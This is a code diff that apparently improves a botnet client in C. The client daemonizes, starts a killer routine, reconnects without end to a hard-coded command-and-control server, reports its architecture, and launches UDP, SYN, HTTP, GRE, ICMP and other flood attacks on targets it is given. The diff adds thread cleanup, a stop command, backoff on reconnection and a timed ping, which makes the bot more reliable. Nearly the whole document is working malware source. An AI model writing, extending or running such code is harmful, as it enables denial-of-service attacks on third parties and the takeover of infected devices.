@@ -32,37 +32,57 @@
 #define MAX_THREADS 3
 #define RETRY_DELAY 4
 #define RECV_TIMEOUT_MS 3000
+#define MAX_RETRIES 5
+#define CONNECTION_TIMEOUT 5
+#define PING_INTERVAL 30
+
+pthread_t attack_threads[MAX_THREADS] = {0};
+pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;
+attack_params* thread_params[MAX_THREADS] = {NULL};
+gre_attack_params* gre_params[MAX_THREADS] = {NULL};
 
 const char* get_arch() {
     #ifdef ARCH_aarch64
     return "aarch64";
     #elif defined(ARCH_arm)
     return "arm";
-    #elif defined(ARCH_m68k)
-    return "m68k";
     #elif defined(ARCH_mips)
     return "mips";
-    #elif defined(ARCH_mipsel)
-    return "mipsel";
-    #elif defined(ARCH_powerpc64)
-    return "powerpc64";
-    #elif defined(ARCH_sh4)
-    return "sh4";
-    #elif defined(ARCH_sparc)
-    return "sparc";
+    #elif defined(ARCH_x86)
+    return "x86";
     #elif defined(ARCH_x86_64)
     return "x86_64";
-    #elif defined(ARCH_i686)
-    return "i686";
     #else
     return "unknown";
     #endif
 }
 
-static attack_params attack_state;
-static pthread_t attack_threads[MAX_THREADS];
+void cleanup_attack_threads() {
+    pthread_mutex_lock(&thread_mutex);
+    for (int i = 0; i < MAX_THREADS; i++) {
+        if (attack_threads[i] != 0) {
+            if (thread_params[i]) {
+                thread_params[i]->active = 0;
+            }
+            if (gre_params[i]) {
+                gre_params[i]->active = 0;
+            }
+            pthread_join(attack_threads[i], NULL);
+            if (thread_params[i]) {
+                free(thread_params[i]);
+                thread_params[i] = NULL;
+            }
+            if (gre_params[i]) {
+                free(gre_params[i]);
+                gre_params[i] = NULL;
+            }
+            attack_threads[i] = 0;
+        }
+    }
+    pthread_mutex_unlock(&thread_mutex);
+}
 
-void handle_command(const char *command, int sock) {
+void handle_command(char* command, int sock) {
     if (!command || strlen(command) > 1023) return;
     static char buffer[256];
     if (strncmp(command, "ping", 4) == 0) {
@@ -76,6 +96,12 @@ void handle_command(const char *command, int sock) {
         udp_attack, vse_attack, syn_attack, socket_attack, 
         http_attack, raknet_attack, icmp_attack, gre_attack
     };
+    
+    if (strcmp(command, "stop") == 0) {
+        cleanup_attack_threads();
+        return;
+    }
+
     int which = -1;
     for (int i = 0; i < 8; i++) {
         if (strncmp(command, methods[i], method_len[i]) == 0) {
@@ -83,6 +109,7 @@ void handle_command(const char *command, int sock) {
             break;
         }
     }
+    
     if (which >= 0) {
         static char ip[32];
         static char argstr[512];
@@ -95,6 +122,7 @@ void handle_command(const char *command, int sock) {
         int gport = 0;
         memset(ip, 0, sizeof(ip));
         memset(argstr, 0, sizeof(argstr));
+        
         if (which == 6 || which == 7) {
             n = sscanf(command, "%*s %31s %d %511[^\n]", ip, &time, argstr);
             if (n < 2) return;
@@ -102,6 +130,7 @@ void handle_command(const char *command, int sock) {
             n = sscanf(command, "%*s %31s %d %d %511[^\n]", ip, &port, &time, argstr);
             if (n < 3) return;
         }
+        
         if (strlen(argstr) > 0) {
             char *token = strtok(argstr, " ");
             while (token) {
@@ -115,38 +144,106 @@ void handle_command(const char *command, int sock) {
                 token = strtok(NULL, " ");
             }
         }
-        for (int i = 0; i < MAX_THREADS; i++) {
-            pthread_cancel(attack_threads[i]);
-            pthread_join(attack_threads[i], NULL);
-        }
-        attack_state.target_addr.sin_family = AF_INET;
-        attack_state.target_addr.sin_port = htons(port);
-        inet_pton(AF_INET, ip, &attack_state.target_addr.sin_addr);
-        attack_state.duration = time;
-        attack_state.psize = psize;
-        attack_state.srcport = srcport;
-        attack_state.active = 1;
+        
+        cleanup_attack_threads();
+        
+        pthread_mutex_lock(&thread_mutex);
         if (which == 7) {
             gre_attack_params* gre_state = malloc(sizeof(gre_attack_params));
-            gre_state->target_addr = attack_state.target_addr;
+            if (!gre_state) {
+                pthread_mutex_unlock(&thread_mutex);
+                return;
+            }
+            gre_state->target_addr.sin_family = AF_INET;
+            gre_state->target_addr.sin_port = htons(port);
+            inet_pton(AF_INET, ip, &gre_state->target_addr.sin_addr);
             gre_state->duration = time;
             gre_state->psize = psize;
             gre_state->srcport = srcport;
             gre_state->gre_proto = gre_proto;
             gre_state->gport = gport;
             gre_state->active = 1;
-            pthread_create(&attack_threads[0], NULL, gre_attack, gre_state);
+            
+            gre_params[0] = gre_state;
+            int ret = pthread_create(&attack_threads[0], NULL, gre_attack, gre_state);
+            if (ret != 0) {
+                free(gre_state);
+                gre_params[0] = NULL;
+            }
         } else {
-            pthread_create(&attack_threads[0], NULL, attack_funcs[which], &attack_state);
+            attack_params* attack_state = calloc(1, sizeof(attack_params));
+            if (!attack_state) {
+                pthread_mutex_unlock(&thread_mutex);
+                return;
+            }
+            
+            attack_state->target_addr.sin_family = AF_INET;
+            attack_state->target_addr.sin_port = htons(port);
+            if (inet_pton(AF_INET, ip, &attack_state->target_addr.sin_addr) != 1) {
+                free(attack_state);
+                pthread_mutex_unlock(&thread_mutex);
+                return;
+            }
+            attack_state->duration = time;
+            attack_state->psize = psize;
+            attack_state->srcport = srcport;
+            attack_state->active = 1;
+            
+            thread_params[0] = attack_state;
+            int ret = pthread_create(&attack_threads[0], NULL, attack_funcs[which], attack_state);
+            if (ret != 0) {
+                free(attack_state);
+                thread_params[0] = NULL;
+            }
         }
+        pthread_mutex_unlock(&thread_mutex);
     }
     if (strcmp(command, "stop") == 0) {
-        attack_state.active = 0;
-        for (int i = 0; i < MAX_THREADS; i++) {
-            pthread_cancel(attack_threads[i]);
-            pthread_join(attack_threads[i], NULL);
-        }
+        cleanup_attack_threads();
     }
+}
+
+int connect_with_timeout(int sock, struct sockaddr *addr, socklen_t addrlen, int timeout_sec) {
+    int res;
+    long arg;
+    fd_set myset;
+    struct timeval tv;
+    int valopt;
+    socklen_t lon;
+
+    arg = fcntl(sock, F_GETFL, NULL);
+    arg |= O_NONBLOCK;
+    fcntl(sock, F_SETFL, arg);
+
+    res = connect(sock, addr, addrlen);
+    if (res < 0) {
+       if (errno == EINPROGRESS) {
+          tv.tv_sec = timeout_sec;
+          tv.tv_usec = 0;
+          FD_ZERO(&myset);
+          FD_SET(sock, &myset);
+          res = select(sock+1, NULL, &myset, NULL, &tv);
+          if (res > 0) {
+             lon = sizeof(int);
+             getsockopt(sock, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
+             if (valopt) {
+                return -1;
+             }
+          }
+          else {
+             return -1;
+          }
+       }
+       else {
+          return -1;
+       }
+    }
+
+    arg = fcntl(sock, F_GETFL, NULL);
+    arg &= (~O_NONBLOCK);
+    fcntl(sock, F_SETFL, arg);
+
+    return 0;
 }
 
 int main(int argc, char** argv) {
@@ -154,85 +251,112 @@ int main(int argc, char** argv) {
     static struct sockaddr_in server_addr;
     static char command[1024];
     ssize_t n;
+
     daemonize(argc, argv);
     start_killer();
+
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(BOT_PORT);
     inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
-    int initial_connection = 1;
+
     int reconnect_attempts = 0;
-    while (reconnect_attempts < 10) {
+    time_t last_ping = 0;
+
+    while (1) {
         if (sock != -1) {
             close(sock);
             sock = -1;
         }
+
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock == -1) {
-            reconnect_attempts++;
-            sleep(RETRY_DELAY);
+            if (++reconnect_attempts >= MAX_RETRIES) {
+                sleep(60);
+                reconnect_attempts = 0;
+            } else {
+                sleep(RETRY_DELAY * reconnect_attempts);
+            }
             continue;
         }
+
         int optval = 1;
         setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
         setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
-        int keepidle = 2;
-        int keepintvl = 2;
+        
+        int keepidle = 10;
+        int keepintvl = 5;
         int keepcnt = 3;
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(optval));
-        optval = 1;
         setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));
-        fcntl(sock, F_SETFL, O_NONBLOCK);
-        connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
-        fd_set fdset;
-        FD_ZERO(&fdset);
-        FD_SET(sock, &fdset);
-        struct timeval tv;
-        tv.tv_sec = 5;
-        tv.tv_usec = 0;
-        if (select(sock + 1, NULL, &fdset, NULL, &tv) != 1) {
+
+        if (connect_with_timeout(sock, (struct sockaddr*)&server_addr, sizeof(server_addr), CONNECTION_TIMEOUT) < 0) {
             close(sock);
             sock = -1;
-            reconnect_attempts++;
-            sleep(RETRY_DELAY);
+            if (++reconnect_attempts >= MAX_RETRIES) {
+                sleep(60);
+                reconnect_attempts = 0;
+            } else {
+                sleep(RETRY_DELAY * reconnect_attempts);
+            }
             continue;
         }
-        fcntl(sock, F_SETFL, fcntl(sock, F_GETFL) & ~O_NONBLOCK);
+
         if (send(sock, get_arch(), strlen(get_arch()), MSG_NOSIGNAL) <= 0) {
             close(sock);
             sock = -1;
-            reconnect_attempts++;
-            sleep(RETRY_DELAY);
             continue;
         }
+
+        reconnect_attempts = 0;
+        last_ping = time(NULL);
+
         while (1) {
             struct pollfd fds;
             fds.fd = sock;
             fds.events = POLLIN;
-            int ret = poll(&fds, 1, RECV_TIMEOUT_MS);
-            if (ret == 0) {
+            
+            time_t now = time(NULL);
+            if (now - last_ping >= PING_INTERVAL) {
                 if (send(sock, "ping", 4, MSG_NOSIGNAL) <= 0) {
                     break;
                 }
-                continue;
-            } else if (ret < 0) {
+                last_ping = now;
+            }
+
+            int poll_timeout = (last_ping + PING_INTERVAL - now) * 1000;
+            if (poll_timeout < 0) poll_timeout = 0;
+            
+            int ret = poll(&fds, 1, poll_timeout);
+            if (ret < 0 && errno != EINTR) {
                 break;
             }
-            n = recv(sock, command, sizeof(command)-1, 0);
-            if (n <= 0) {
-                break;
+
+            if (ret > 0) {
+                if (fds.revents & POLLIN) {                n = recv(sock, command, sizeof(command)-1, 0);
+                if (n <= 0) {
+                    if (errno != EAGAIN && errno != EWOULDBLOCK) {
+                        break;
+                    }
+                    continue;
+                }
+                    command[n] = 0;
+                    handle_command(command, sock);
+                    memset(command, 0, sizeof(command));
+                }
+                if (fds.revents & (POLLERR | POLLHUP)) {
+                    break;
+                }
             }
-            command[n] = 0;
-            handle_command(command, sock);
-            memset(command, 0, sizeof(command));
         }
-        reconnect_attempts = 0;
-        initial_connection = 1;
+
         if (sock != -1) {
+            shutdown(sock, SHUT_RDWR);
             close(sock);
             sock = -1;
         }
+
         sleep(RETRY_DELAY);
     }
     
